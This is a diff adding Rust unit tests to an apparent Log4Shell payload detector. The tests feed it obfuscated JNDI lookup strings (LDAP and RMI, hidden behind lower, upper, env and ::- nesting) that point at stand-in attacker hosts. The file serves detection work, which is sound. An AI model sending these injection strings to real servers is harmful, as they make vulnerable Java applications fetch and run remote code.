@@ -68,3 +68,37 @@ fn main() {
 
     payloads.iter().for_each(|payload| println!("{}", payload));
 }
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    #[test]
+    fn detects_ldap() {
+        let rules: Vec<Vec<char>> = vec!["${jndi:ldap://".chars().collect()];
+        let lines = vec![
+            "${jndi:ldap://somesitehackerofhell.com/z}",
+            "${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}${env:ENV_NAME:-l}dap${env:ENV_NAME:-:}//somesitehackerofhell.com/z}",
+            "${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://somesitehackerofhell.com/z}",
+            "${${upper:j}ndi:${upper:l}${upper:d}a${lower:p}://somesitehackerofhell.com/z}",
+            "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://somesitehackerofhell.com/z}"
+        ];
+
+        assert!(lines.iter().all(|line| is_log4j_payload(line, &rules)));
+    }
+
+    #[test]
+    fn detects_rmi() {
+        let rules: Vec<Vec<char>> = vec!["${jndi:rmi://".chars().collect()];
+        let lines = vec![
+            "${${::-j}ndi:rmi://asdasd.asdasd.asdasd/ass}",
+            "${jndi:rmi://adsasd.asdasd.asdasd}",
+            "${${lower:jndi}:${lower:rmi}://adsasd.asdasd.asdasd/poc}",
+            "${${lower:${lower:jndi}}:${lower:rmi}://adsasd.asdasd.asdasd/poc}",
+            "${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://adsasd.asdasd.asdasd/poc}",
+            "${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://xxxxxxx.xx/poc}",
+        ];
+
+        assert!(lines.iter().all(|line| is_log4j_payload(line, &rules)));
+    }
+}
